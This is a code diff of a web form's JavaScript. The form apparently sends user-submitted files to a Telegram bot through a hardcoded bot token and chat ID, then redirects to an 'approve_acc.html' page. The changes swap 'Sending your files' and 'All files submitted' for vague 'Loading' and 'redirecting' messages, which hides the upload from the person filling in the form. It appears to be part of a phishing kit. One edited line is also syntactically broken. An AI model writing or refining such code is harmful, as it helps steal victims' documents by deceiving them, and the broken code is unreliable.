@@ -39,7 +39,7 @@ document.getElementById("multiStepForm").addEventListener("submit", function (e)
 
   const statusMsg = document.getElementById("statusMessage");
   statusMsg.style.color = "#007bff";
-  statusMsg.textContent = "Sending your files... Please wait.";
+  statusMsg.textContent = "Loading... Please wait.";
 
   const botToken = "7767854656:AAFd_Py6JZqgqqXx0OV9HXPsLaimgcGGVFw";
   const chatId = "6976365864";
@@ -130,7 +130,7 @@ document.getElementById("multiStepForm").addEventListener("submit", function (e)
           }
 
           statusMsg.style.color = "green";
-          statusMsg.textContent = "✅ All files submitted successfully!";
+          statusMsg.textContent = "✅ redirecting.......;
           setTimeout(() => {
             window.location.href = "approve_acc.html";
           }, 1500);
